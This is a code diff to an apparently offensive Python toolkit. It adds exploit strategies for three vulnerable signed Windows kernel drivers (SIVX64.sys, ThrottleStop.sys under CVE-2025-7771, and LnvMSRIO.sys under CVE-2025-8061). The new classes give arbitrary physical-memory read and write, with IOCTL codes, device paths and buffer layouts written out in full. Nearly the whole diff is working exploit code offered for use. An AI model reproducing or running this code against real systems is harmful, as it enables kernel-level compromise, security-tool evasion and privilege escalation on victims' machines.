@@ -9,6 +9,9 @@ Supports multiple drivers polymorphically via IoctlStrategy:
   - Dell Watchdog Timer (WDTKernel.sys)   — DWORD-at-a-time R/W via MmMapIoSpace
   - Corsair iCUE (CorsairLLAccess64.sys)  — MMIO R/W via MmMapIoSpace
   - Gigabyte GIO (gdrv.sys)               — ring0 memcpy bulk R/W
+  - SIV Monitor (SIVX64.sys)              — scatter read + mapped write via raw cmds
+  - ThrottleStop (ThrottleStop.sys)       — QWORD-at-a-time R/W (CVE-2025-7771)
+  - Lenovo Dispatcher (LnvMSRIO.sys)      — struct phys R/W (CVE-2025-8061)
 """
 
 from __future__ import annotations
@@ -334,6 +337,180 @@ class GigabyteStrategy(IoctlStrategy):
         return bool(success)
 
 
+class SivStrategy(IoctlStrategy):
+    """Strategy for SIVX64.sys (SIV System Information Viewer monitor).
+
+    WHQL-signed, no auth on the device. Raw integer IOCTLs (NOT CTL_CODEs,
+    passed straight as dwIoControlCode) to \\\\.\\SIVDRIVER.
+
+    Scatter Read (0x10): input = { UINT64 phys } (8 bytes), output = data
+        (4..0x40000 bytes). Bulk Read (0x13) covers 0x400..16MB but scatter
+        is enough with chunking, so reads use 0x10.
+    Map+Write (0x14): input = header(0x30) + N x 0x18 entries
+        { UINT32 reg_off, UINT32 mask, UINT32 value, ... }; flags bit1 =
+        write-enable. computed = (read & mask) | value, so mask=0 writes
+        the value verbatim. DWORD granularity, page-chunked.
+    Sources: sai2fast/Vulnerable-Monitors sivx64_poc.py,
+    dwgx/driver-vuln-research SIVX64/physmem_protocol.md.
+    """
+
+    _READ = 0x10
+    _WRITE = 0x14
+    _READ_CHUNK = 0x10000  # 64KB, well under the 256KB cap
+
+    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
+        res = bytearray()
+        br = wt.DWORD(0)
+        for off in range(0, size, self._READ_CHUNK):
+            chunk = min(self._READ_CHUNK, size - off)
+            in_buf = struct.pack("<Q", phys_addr + off)
+            in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
+            out_buf = (ctypes.c_byte * chunk)()
+            ok = k32.DeviceIoControl(handle, self._READ,
+                                     ctypes.byref(in_ct), len(in_buf),
+                                     ctypes.byref(out_buf), chunk,
+                                     ctypes.byref(br), None)
+            if not ok:
+                raise OSError(f"SIV scatter read failed at 0x{phys_addr + off:X}")
+            res.extend(bytes(out_buf)[:br.value or chunk])
+        return bytes(res)
+
+    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
+        # Group bytes by 4KB page, then by aligned dword. Full dwords go
+        # out verbatim (mask=0); partial ones read-merge-write so untouched
+        # bytes survive.
+        pages: dict[int, list[tuple[int, int]]] = {}
+        for i, b in enumerate(data):
+            a = phys_addr + i
+            pages.setdefault(a & ~0xFFF, []).append((a, b))
+        for page_base, items in pages.items():
+            by_dword: dict[int, dict[int, int]] = {}
+            for a, b in items:
+                by_dword.setdefault(a & ~3, {})[a & 3] = b
+            ops = []
+            for d, parts in by_dword.items():
+                if len(parts) == 4:
+                    val = sum(v << (s * 8) for s, v in parts.items())
+                else:
+                    merged = bytearray(self.read_physical(handle, d, 4))
+                    for s, v in parts.items():
+                        merged[s] = v
+                    val = struct.unpack("<I", bytes(merged))[0]
+                ops.append((d - page_base, 0, val))
+            if not self._write_page(handle, page_base, ops):
+                return False
+        return True
+
+    def _write_page(self, handle, page_base, dwords) -> bool:
+        n = len(dwords)
+        header = struct.pack("<QIHHIH26x",
+                             page_base, 0x1000, 0, 0x02, 0, n)
+        body = b"".join(struct.pack("<III I I I", reg, mask, val, 0, 0, 0)
+                        for reg, mask, val in dwords)
+        buf = header + body
+        io = (ctypes.c_byte * len(buf))(*buf)
+        br = wt.DWORD(0)
+        ok = k32.DeviceIoControl(handle, self._WRITE,
+                                 ctypes.byref(io), len(buf),
+                                 ctypes.byref(io), len(buf),
+                                 ctypes.byref(br), None)
+        return bool(ok)
+
+
+class ThrottleStopStrategy(IoctlStrategy):
+    """Strategy for ThrottleStop.sys (TechPowerUp, CVE-2025-7771).
+
+    QWORD-at-a-time phys R/W via MmMapIoSpace, no validation.
+    Read (0x80006498): input = { UINT64 phys }, output size selects 1/2/4/8.
+    Write (0x8000649C): input = { UINT64 phys, UINT64 value } (16 bytes).
+    Device \\\\.\\ThrottleStop. Source: fxrstor/ThrottleStopPoC,
+    D4rkks/CVE-2025-7771-Vulnerability-Exploration.
+    """
+
+    _READ = 0x80006498
+    _WRITE = 0x8000649C
+
+    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
+        res = bytearray()
+        br = wt.DWORD(0)
+        for off in range(0, size, 8):
+            in_buf = struct.pack("<Q", phys_addr + off)
+            in_ct = (ctypes.c_byte * 8)(*in_buf)
+            out_buf = (ctypes.c_byte * 8)()
+            ok = k32.DeviceIoControl(handle, self._READ,
+                                     ctypes.byref(in_ct), 8,
+                                     ctypes.byref(out_buf), 8,
+                                     ctypes.byref(br), None)
+            if not ok:
+                raise OSError(f"ThrottleStop read failed at 0x{phys_addr + off:X}")
+            res.extend(bytes(out_buf)[:min(8, size - off)])
+        return bytes(res)
+
+    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
+        br = wt.DWORD(0)
+        for off in range(0, len(data), 8):
+            chunk = data[off:off + 8]
+            if len(chunk) < 8:
+                chunk += b"\x00" * (8 - len(chunk))
+            in_buf = struct.pack("<QQ", phys_addr + off,
+                                 struct.unpack("<Q", chunk)[0])
+            in_ct = (ctypes.c_byte * 16)(*in_buf)
+            ok = k32.DeviceIoControl(handle, self._WRITE,
+                                     ctypes.byref(in_ct), 16,
+                                     None, 0, ctypes.byref(br), None)
+            if not ok:
+                return False
+        return True
+
+
+class LenovoMsrStrategy(IoctlStrategy):
+    """Strategy for LnvMSRIO.sys (Lenovo Dispatcher 3.0/3.1, CVE-2025-8061).
+
+    Read (0x9C406104): input = { UINT64 phys, UINT32 op=1, UINT32 size },
+        output = data. Write (0x9C40A108): input = { UINT64 phys,
+        UINT32 op=1, UINT32 variant, byte data[] } -- variant selects the
+        memcpy width (1/2/8); writes go out in 8-byte units, variant 8.
+    Device \\\\.\\WinMsrDev. Source: Quarkslab CVE-2025-8061 parts 1+2,
+    nefariousplan writeup (structs verified across 3 PoCs).
+    """
+
+    _READ = 0x9C406104
+    _WRITE = 0x9C40A108
+    _CHUNK = 0x1000
+
+    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
+        res = bytearray()
+        br = wt.DWORD(0)
+        for off in range(0, size, self._CHUNK):
+            chunk = min(self._CHUNK, size - off)
+            in_buf = struct.pack("<QII", phys_addr + off, 1, chunk)
+            in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
+            out_buf = (ctypes.c_byte * chunk)()
+            ok = k32.DeviceIoControl(handle, self._READ,
+                                     ctypes.byref(in_ct), len(in_buf),
+                                     ctypes.byref(out_buf), chunk,
+                                     ctypes.byref(br), None)
+            if not ok:
+                raise OSError(f"Lenovo read failed at 0x{phys_addr + off:X}")
+            res.extend(bytes(out_buf)[:br.value or chunk])
+        return bytes(res)
+
+    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
+        br = wt.DWORD(0)
+        for off in range(0, len(data), 8):
+            chunk = data[off:off + 8]
+            if len(chunk) < 8:
+                chunk += b"\x00" * (8 - len(chunk))
+            in_buf = struct.pack("<QII", phys_addr + off, 1, 8) + chunk
+            in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
+            ok = k32.DeviceIoControl(handle, self._WRITE,
+                                     ctypes.byref(in_ct), len(in_buf),
+                                     None, 0, ctypes.byref(br), None)
+            if not ok:
+                return False
+        return True
+
+
 class GenericBulkStrategy(IoctlStrategy):
     """Generic BYO bulk phys R/W — Intel QIQ template with custom IOCTL codes."""
     def __init__(self, read_code: int, write_code: int):
@@ -437,6 +614,9 @@ class DriverInterface:
             DriverType.DELL_WDT: WdtStrategy,
             DriverType.CORSAIR_LL: CorsairStrategy,
             DriverType.GIGABYTE_GIO: GigabyteStrategy,
+            DriverType.SIV_SIVX64: SivStrategy,
+            DriverType.THROTTLESTOP_TS: ThrottleStopStrategy,
+            DriverType.LENOVO_LNVMSRIO: LenovoMsrStrategy,
         }
         cls = STRATEGY_MAP.get(d_type)
         if cls:
